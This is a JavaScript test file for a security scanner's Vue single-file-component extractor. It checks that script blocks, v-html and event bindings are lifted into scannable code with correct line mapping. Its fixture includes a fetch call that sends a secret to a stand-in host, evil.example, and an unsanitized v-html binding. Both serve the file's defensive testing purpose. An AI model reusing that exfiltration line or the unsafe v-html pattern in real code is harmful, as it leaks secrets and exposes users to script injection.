// extractVueSfc splits a .vue single-file component into JsSources: its <script>
// blocks (with the parse mode from `lang`) and its template binding expressions
// (v-html lifted to an innerHTML write, other bindings to bare expressions). The
// scanUnsafeHtml/parseJs assertions prove the lifted sources feed the ordinary
// extractors, and the lineOffset assertions prove locations map back to the .vue.

import { test } from "node:test";
import assert from "node:assert/strict";

import { extractVueSfc } from "../../src/scan/vue-sfc.js";
import { parseJs } from "../../src/parse/ast.js";
import { scanUnsafeHtml } from "../../src/parse/unsafe-html.js";

const SFC = `<script setup lang="ts">
const secret: string = getSecret();
fetch("https://evil.example/x?d=" + secret);
</script>

<template>
  <div v-html="userMarkup"></div>
  <button @click="fetch(remote)">go</button>
  <img :src="dynUrl" v-for="dynUrl in urls" />
  <span v-text="safe">no expr lifted for v-text-less directives</span>
</template>
`;

test("extractVueSfc: <script lang=ts> keeps ts mode and maps lines", () => {
  const srcs = extractVueSfc("Comp.vue", SFC);
  const script = srcs.find((s) => /getSecret/.test(s.code));
  assert.ok(script, "the <script setup> block is extracted");
  assert.equal(
    script.parseAs,
    ".ts",
    "lang=ts selects the TypeScript parse mode"
  );
  assert.equal(script.file, "Comp.vue");
  // The block's rawtext begins on the <script> line (1), so an AST error/loc on
  // its 2nd line maps to file line 2.
  assert.equal(script.lineOffset, 0);
  // It parses under the ts hint (type annotation would fatal without it).
  assert.equal(parseJs(script.code, script.parseAs).parseError, null);
});

test("extractVueSfc: v-html lifts to an innerHTML sink write", () => {
  const srcs = extractVueSfc("Comp.vue", SFC);
  const vhtml = srcs.find((s) => /innerHTML/.test(s.code));
  assert.ok(vhtml, "v-html produces a source");
  assert.equal(vhtml.lineOffset, 6, "maps to the <div> on line 7");
  const { hits } = scanUnsafeHtml(vhtml.code, vhtml.lineOffset);
  assert.equal(hits.length, 1);
  assert.equal(hits[0].sink, "innerHTML");
  assert.equal(hits[0].line, 7, "the finding lands on the .vue line");
});

test("extractVueSfc: @click and :src bindings become scannable expressions", () => {
  const srcs = extractVueSfc("Comp.vue", SFC);
  const codes = srcs.map((s) => s.code);
  assert.ok(codes.includes("(fetch(remote))"), "@click handler is lifted");
  assert.ok(codes.includes("(dynUrl)"), ":src binding is lifted");
});

test("extractVueSfc: v-for is not lifted (its `x in xs` is not an expression)", () => {
  const srcs = extractVueSfc("Comp.vue", SFC);
  assert.ok(
    !srcs.some((s) => /\bin\b/.test(s.code) && /urls/.test(s.code)),
    "no source carries the v-for `dynUrl in urls` clause"
  );
});

test("extractVueSfc: a plain <script> with no lang parses as JavaScript", () => {
  const srcs = extractVueSfc(
    "P.vue",
    `<script>\nexport const a = <div/>;\n</script>`
  );
  const s = srcs[0];
  assert.equal(s.parseAs, ".js");
  // .js enables JSX, so a render-function JSX literal still parses.
  assert.equal(parseJs(s.code, s.parseAs).parseError, null);
});
